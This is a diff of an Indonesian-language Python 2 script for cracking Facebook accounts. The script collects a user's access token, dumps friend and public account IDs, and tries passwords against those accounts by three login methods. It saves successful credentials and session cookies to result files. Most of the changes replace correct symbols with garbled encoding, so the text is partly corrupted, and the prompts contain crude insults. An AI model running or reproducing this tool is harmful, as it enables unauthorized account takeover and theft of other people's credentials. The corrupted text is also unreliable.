@@ -5,19 +5,19 @@ import os
 try:
     import requests
 except ImportError:
-    print '\n [×] Modul requests belum terinstall!...\n'
+    print '\n [Ã—] Modul requests belum terinstall!...\n'
     os.system('pip2 install requests')
 
 try:
     import concurrent.futures
 except ImportError:
-    print '\n [×] Modul Futures belum terinstall!...\n'
+    print '\n [Ã—] Modul Futures belum terinstall!...\n'
     os.system('pip2 install futures')
 
 try:
     import bs4
 except ImportError:
-    print '\n [×] Modul Bs4 belum terinstall!...\n'
+    print '\n [Ã—] Modul Bs4 belum terinstall!...\n'
     os.system('pip2 install bs4')
 
 import requests, os, re, bs4, sys, json, time, random, datetime
@@ -57,7 +57,7 @@ warna = random.choice(my_color)
 koh = '100078379432123'
 xi_jimpinx = '140106845088579'
 ok, cp, id, loop = [], [], [], 0
-hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Ijin pake scriptnya Bang Taufiq XD', 'Keren Master'])
+hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Ijin pake scriptnya bang', 'Keren Master'])
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
 # lempankkkkkkkk
@@ -79,7 +79,7 @@ logo = ''' \033[0;96m __________________________________
 \033[0;96m ___  __/__  __ )__  ____/__  ____/
 \033[0;96m __  /  __  __  |_  /_   __  /_    
 \033[0;96m _  /   _  /_/ /_  __/   _  __/    
-\033[0;96m /_/    /_____/ /_/      /_/ \033[0;91m © Version 22.2 '''
+\033[0;96m /_/    /_____/ /_/      /_/ \033[0;91m Â© Version 22.2 '''
 
 lo_ngentod = '140106845088579'
 # crack selesai
@@ -89,15 +89,15 @@ def hasil(ok,cp):
         print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
         print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
     else:
-        print '\n\n [%s!%s] Lah? Kok gak dapet result;v makannya ganteng😆'%(M,N);exit()
+        print '\n\n [%s!%s] Lah? Kok gak dapet result;v makannya gantengðŸ˜†'%(M,N);exit()
 
 #masuk token
 def yayanxd():
     os.system('clear')
-    kontol = raw_input('\n %s[%s?%s] TOKEN FACEBOOK :%s '%(N,M,N,H))
+    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
-        print '\n\n %s*%s SELAMAT DATANG DI TOOLS SAYA %s%s%s'%(O,N,K,nama,N);time.sleep(2)
+        print '\n\n %s*%s WELCOME TO TOOLS TBFF %s%s%s'%(O,N,K,nama,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
         os.system('xdg-open https://www.facebook.com/100078379432123')
         moch_yayan()
@@ -110,11 +110,11 @@ def moch_yayan():
     try:
     	kontol = open('.memek.txt', 'r').read()
     except IOError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%sÃ—%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
     except KeyError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%sÃ—%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
@@ -135,7 +135,7 @@ def moch_yayan():
     print '\033[0;97m--------------------------------------------\n';time.sleep(0.03)
     pepek = raw_input('\n [*] CHOSEE : ')
     if pepek == '':
-        print '\n %s[%s×%s] JANGAN KOSONG !'%(N,M,N);time.sleep(2);moch_yayan()
+        print '\n %s[%sÃ—%s] JANGAN KOSONG !'%(N,M,N);time.sleep(2);moch_yayan()
     elif pepek in['1','01']:
         teman(kontol)
     elif pepek in['2','02']:
@@ -159,12 +159,12 @@ def moch_yayan():
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
             for memek in total:
             	kontol = memek.replace("\n","")
-                titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
+                titid  = kontol.replace(" [âœ“] "," \x1b[0m[\x1b[1;92mâœ“\x1b[0m]\x1b[1;92m ").replace(" [Ã—] ", " \x1b[0m[\x1b[1;93mÃ—\x1b[0m]\x1b[1;93m ")
                 print("%s%s"%(titid,N));time.sleep(0.03)
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
         except (IOError):
-            print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
+            print("\n %s[%sÃ—%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
     elif pepek in['5','05']:
         seting_yntkts()
@@ -172,9 +172,9 @@ def moch_yayan():
         print '\n'
         tod()
         time.sleep(1);os.system('rm -rf .memek.txt')
-        jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
+        jalan('\n %s[%sâœ“%s]%s berhasil menghapus token'%(N,H,N,H));exit()
     else:
-        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
+        print '\n %s[%sÃ—%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
 
 def wuhan(kontol):
     try:
@@ -206,8 +206,8 @@ def teman(kontol):
             time.sleep(0.0050)
 
         xxx.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
+        jalan('\n\n %s[%sâœ“%s] berhasil dump id dari teman'%(N,H,N))
+        print ' [%sâ€¢%s] salin output file ðŸ‘‰ ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
@@ -238,8 +238,8 @@ def publik(kontol):
             time.sleep(0.0050)
 
         xxx.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
+        jalan('\n\n %s[%sâœ“%s] berhasil dump id dari teman publik'%(N,H,N))
+        print ' [%sâ€¢%s] salin output file ðŸ‘‰ ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
@@ -253,7 +253,7 @@ def seting_yntkts():
     print ' (%s2%s) check user agent'%(O,N)
     ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
     if ytbjts == '':
-        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
+        print '\n %s[%sÃ—%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
     elif ytbjts in['1','01']:
         yo_ndak_tau_ko_tanya_saia()
     elif ytbjts in['2','02']:
@@ -264,23 +264,23 @@ def seting_yntkts():
         print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
         raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     else:
-        print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
+        print '\n %s[%sÃ—%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
 # User Agent baru
 def yo_ndak_tau_ko_tanya_saia():
     os.system('rm -rf YNTKTS.txt')
     _asu_ = raw_input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
     if _asu_ == '':
-        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
+        print '\n %s[%sÃ—%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
     elif _asu_ in['Y','y']:
         jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
         _agen_ = raw_input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
-        jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
+        jalan('\n %s[%sâœ“%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
         raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     elif _asu_ in['T','t']:
         _agen_ = raw_input(' [%s?%s] masukan user agent :%s '%(O,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
-        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
+        jalan('\n %s[%sâœ“%s] berhasil mengganti user agent...'%(N,H,N))
         raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     else:
         print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
@@ -296,23 +296,23 @@ class __crack__:
             self.id = open(self.apk).read().splitlines()
             print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
         except:
-            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
+            print '\n %s[%sÃ—%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
             raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
         ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
-            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sayang123,anjing123,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
+            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
                 pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                 print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                 if pwek == '':
-                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
+                    print '\n %s[%sÃ—%s] jangan kosong bro kata sandi nya'%(N,M,N)
                 elif len(pwek)<=5:
-                    print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
+                    print '\n %s[%sÃ—%s] kata sandi minimal 6 karakter'%(N,M,N)
                 else:
                     def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                         cin = raw_input('\n [*] method : ')
                         if cin == '':
-                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);__yan__()()
+                            print '\n %s[%sÃ—%s] jangan kosong bro'%(N,M,N);__yan__()()
                         elif cin == '1':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -353,21 +353,21 @@ class __crack__:
                             os.remove(self.apk)
                             hasil(ok,cp)
                         else:
-                            print '\n %s[%s×%s] input yang bener'%(N,M,N);__yan__()
-                    print '\n [ pilih method login - silahkan coba satu² ]\n'
+                            print '\n %s[%sÃ—%s] input yang bener'%(N,M,N);__yan__()
+                    print '\n [ pilih method login - silahkan coba satuÂ² ]\n'
                     print ' [%s1%s]. method API (fast)'%(O,N)
                     print ' [%s2%s]. method mbasic (slow)'%(O,N)
                     print ' [%s3%s]. method mobile (super slow)'%(O,N)
                     __yan__(pwek.split(','))
                     break
         elif ___yayanganteng___ in ('T', 't'):
-            print '\n [ pilih method login - silahkan coba satu² ]\n'
+            print '\n [ pilih method login - silahkan coba satuÂ² ]\n'
             print ' [%s1%s]. method API (fast)'%(O,N)
             print ' [%s2%s]. method mbasic (slow)'%(O,N)
             print ' [%s3%s]. method mobile (super slow)'%(O,N)
             self.__pler__()
         else:
-            print '\n %s[%s×%s] Y/t goblok!'%(N,M,N);self.plerr()
+            print '\n %s[%sÃ—%s] Y/t goblok!'%(N,M,N);self.plerr()
         return
 
     def __api__(self, user, __yan__):
@@ -393,7 +393,7 @@ class __crack__:
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
                 print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
-                wrt = ' [✓] %s|%s' % (user,pw)
+                wrt = ' [âœ“] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -404,7 +404,7 @@ class __crack__:
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
                     print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    wrt = ' [Ã—] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -416,7 +416,7 @@ class __crack__:
                     pass
 
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                wrt = ' [Ã—] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -443,7 +443,7 @@ class __crack__:
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
-                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
+                wrt = ' [âœ“] %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -454,7 +454,7 @@ class __crack__:
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
                     print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    wrt = ' [Ã—] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -466,7 +466,7 @@ class __crack__:
                     pass
 
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                wrt = ' [Ã—] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -493,7 +493,7 @@ class __crack__:
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
-                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
+                wrt = ' [âœ“] %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -504,7 +504,7 @@ class __crack__:
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
                     print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    wrt = ' [Ã—] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -516,7 +516,7 @@ class __crack__:
                     pass
 
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                wrt = ' [Ã—] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -526,7 +526,7 @@ class __crack__:
     def __pler__(self):
         yan = raw_input('\n [*] method : ')
         if yan == '':
-            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
+            print '\n %s[%sÃ—%s] jangan kosong bro'%(N,M,N);self.__pler__()
         elif yan in ('1', '01'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -586,7 +586,7 @@ class __crack__:
             hasil(ok,cp)
 
         else:
-            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()
+            print '\n %s[%sÃ—%s] input yang bener'%(N,M,N);self.__pler__()
 
 if __name__ == '__main__':
     os.system('git pull')
